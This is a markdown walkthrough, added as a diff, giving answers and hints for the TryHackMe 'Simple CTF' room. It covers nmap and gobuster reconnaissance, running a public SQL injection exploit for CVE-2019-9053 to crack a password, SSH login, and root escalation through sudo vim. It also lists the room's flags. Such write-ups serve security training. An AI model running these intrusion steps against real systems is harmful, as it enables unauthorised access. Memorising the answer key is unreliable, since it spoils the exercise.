@@ -1,0 +1,127 @@
+#### Link to room: https://tryhackme.com/room/easyctf
+
+#### [Task 1] Simple CTF
+   1. 2
+> Hint:
+>
+> Type the command "nmap -sC -sV \<GIVEN-IP-ADDRESS\>"
+>
+> -sC = Use default scripts to scan the IP address
+>
+> -sV = Use for service/version detection
+>
+> You should get an ouput like this
+```
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.7.16
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+
+```
+> From this output you can see that the ports running under 1000 are ports 21 and 80 
+   2. ssh 
+> Hint:
+>
+> You can see that the highest port number is 2222 and that is running SSH
+   3. CVE-2019-9053 
+> Hint: 
+>
+> If you go to the http page by navigating to "http://\<GIVEN-IP-ADDRESS\>"
+>
+> It is the default ubuntu page, this is strange so makes sense that there must be a sub directory somewhere
+>
+> Type in the command "gobuster dir -u 10.10.171.237 -w /usr//share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt"
+>
+> And the output will show "/simple (Status: 301)"
+>
+> By navigating to "http://\<GIVEN-IP-ADDRESS\>/simple"
+>
+> We are presented with a "CMS Made Simple" page 
+>
+> If we search "CMS MADE SIMPLE CVE", we should see this [page](https://www.exploit-db.com/exploits/46635)
+>
+> With the correct CVE present on that page 
+   4. SQLi
+> Hint: 
+>
+> From this [page](https://www.exploit-db.com/exploits/46635) we can see that the page is vulnerable to SQL injection 
+   5. secret
+> Hint: 
+>
+> If you save the script then we will be able to use it
+>
+> If you go into your documents then the file will be present and will be called "46635.py"
+>
+> If we type "python 46635.py", it will show us the syntax that we will have to use
+>
+> Type the following "python 46635.py -u http://\<GIVEN-IP-ADDRESS\>/simple --crack -w /usr/share/dirb/wordlists/common.txt"
+>
+> The script should output the following: 
+```
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
+
+```
+   6. SSH
+> Hint: 
+>
+> From the nmap output, there was a SSH port open therefore it seems logical that we should be able to login into SSH with these credentials 
+
+   7. G00d j0b, keep up!
+> Hint: 
+>
+> If you type the following command: 
+>
+> ssh -p 2222 mitch@\<GIVEN-IP-ADDRESS\>
+>
+> We should be successfully logged in as mitch and we can "cat user.txt" to see the answer
+   8. sunbath
+> Hint: 
+>
+> Type in "cd .." to go back to the home directory 
+>
+> Type in "ls" to see all directories in the current home directory 
+   9. vim 
+> Hint: 
+>
+> If you type the command "sudo -l", we can see which commands we can run as other users 
+>
+> This should be visible: (root) NOPASSWD: /usr/bin/vim
+>
+> Meaning we could run vim as root 
+   10. W3ll d0n3. You made it!
+> Hint 
+>
+> Type the command "sudo /usr/bin/vim"
+>
+> This will open up a VIM terminal 
+>
+> If you enter ":!bash"
+>
+> You will there be escalated to the root user and you can "cat /root/root.txt"
